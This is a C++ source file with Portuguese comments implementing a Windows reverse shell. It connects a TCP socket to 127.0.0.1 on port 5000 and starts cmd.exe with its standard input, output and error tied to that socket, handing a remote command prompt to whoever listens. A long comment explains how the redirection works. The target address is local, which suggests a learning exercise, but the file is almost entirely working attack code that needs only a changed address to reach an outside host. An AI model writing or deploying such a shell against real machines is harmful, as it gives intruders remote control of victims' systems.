#include <WinSock2.h>
#include <iostream>
#include <Windows.h>

#define PORT 5000

#pragma comment(lib, "Ws2_32.lib") // Biblioteca Winsock 

int main(){
    // Inicializando o socket
    WSADATA wsaData;
    int resultado = WSAStartup(MAKEWORD(2, 2), &wsaData);
    if(resultado != 0){
        std::cerr << "WSAStartup falhou com erro: " << resultado << std::endl;
        return 1;
    }

    // Cria um socket para se conectar ao servidor
    SOCKET ConnectSocket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if(ConnectSocket == INVALID_SOCKET){
        std::cerr << "Erro ao criar o socket: " << WSAGetLastError() << std::endl;
        return 1;
    }

    // Define as informações do servidor que será conectado
    sockaddr_in servidor;
    servidor.sin_family = AF_INET;
    servidor.sin_port = htons(PORT);
    servidor.sin_addr.S_un.S_addr = inet_addr("127.0.0.1"); // Endereço de IP do servidor

    // Conecta ao servidor
    resultado = connect(ConnectSocket, (SOCKADDR*)&servidor, sizeof(servidor));
    if(resultado == SOCKET_ERROR){
        std::cerr << "Falha na conexão com o servidor: " << WSAGetLastError() << std::endl;
        return 1;
    }

    /*
    Essa parte do código está criando uma nova instância do shell CMD do Windows e redirecionando suas entradas e saídas padrões (STDIN, STDOUT e STDERR) para o socket criado anteriormente, permitindo que o usuário possa interagir com o shell através da conexão de rede.
    A estrutura STARTUPINFO é utilizada para passar informações ao sistema operacional sobre como deve ser criado o processo. Já a estrutura PROCESS_INFORMATION é preenchida com informações sobre o processo criado, como o seu identificador.
    A função ZeroMemory() é utilizada para inicializar essas estruturas com zeros.
    O flag STARTF_USESTDHANDLES informa ao sistema operacional que a aplicação está definindo seus próprios manipuladores de arquivos (file handles) para os canais STDIN, STDOUT e STDERR. As variáveis hStdInput, hStdOutput e hStdError definem os manipuladores para os respectivos canais. No caso do código, o socket ConnectSocket é usado para os três canais, o que significa que as entradas e saídas do processo CMD serão enviadas e recebidas através desse socket.
    A variável PromptCommand contém o comando a ser executado pela nova instância do shell CMD, que no caso é cmd.exe. LPCWSTR é um tipo de ponteiro para uma string wide char (16 bits). O prefixo L indica que a string é wide char, e a função CreateProcessW() espera esse tipo de string como argumento.
    */
   
    STARTUPINFO startupInfo;
    PROCESS_INFORMATION processInfo;

    ZeroMemory(&startupInfo, sizeof(startupInfo));
    startupInfo.cb = sizeof(startupInfo);
    ZeroMemory(&processInfo, sizeof(processInfo));

    startupInfo.dwFlags = STARTF_USESTDHANDLES;
    startupInfo.hStdInput = (HANDLE)ConnectSocket;
    startupInfo.hStdOutput = (HANDLE)ConnectSocket;
    startupInfo.hStdError = (HANDLE)ConnectSocket;

    LPCWSTR PromptCommad = L"cmd.exe";

    if(!CreateProcess(PromptCommad, NULL, NULL, NULL, TRUE, 0, NULL, NULL, &startupInfo, &processInfo)){
        std::cerr << "Falha ao criar o processo: " << GetLastError() << std::endl;
        return 1;
    }

    // Espera pelo termino do processo
    WaitForSingleObject(processInfo.hProcess, INFINITE);

    // Fecha os handles do processo
    CloseHandle(processInfo.hProcess);
    CloseHandle(processInfo.hThread);

    // Fecha o socket e elibera o Winsock
    closesocket(ConnectSocket);
    WSACleanup();

    return 0;
}